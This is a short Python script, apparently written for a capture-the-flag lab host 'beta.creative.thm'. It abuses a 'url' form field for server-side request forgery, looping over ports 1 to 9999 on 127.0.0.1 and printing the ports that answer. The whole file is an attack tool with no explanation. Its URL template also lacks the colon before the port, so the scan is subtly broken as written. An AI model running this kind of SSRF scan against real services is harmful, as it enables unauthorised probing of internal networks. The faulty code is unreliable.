#!/usr/bin/python3

import requests

url = input("Enter the URL: ")

headers = {
    "Host": "beta.creative.thm",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://beta.creative.thm",
    "Connection": "close",
    "Referer": "http://beta.creative.thm/",
    "Upgrade-Insecure-Requests": "1"
}


for port in range(1,10000):
    payload = {"url": f"http://127.0.0.1{port}"}
    try:
        r = requests.post(url, data=payload, headers=headers)
        if "Dead" not in r.text:
            print(port)
        else:
            continue
    except requests.exceptions.RequestException as e:
        print(e)
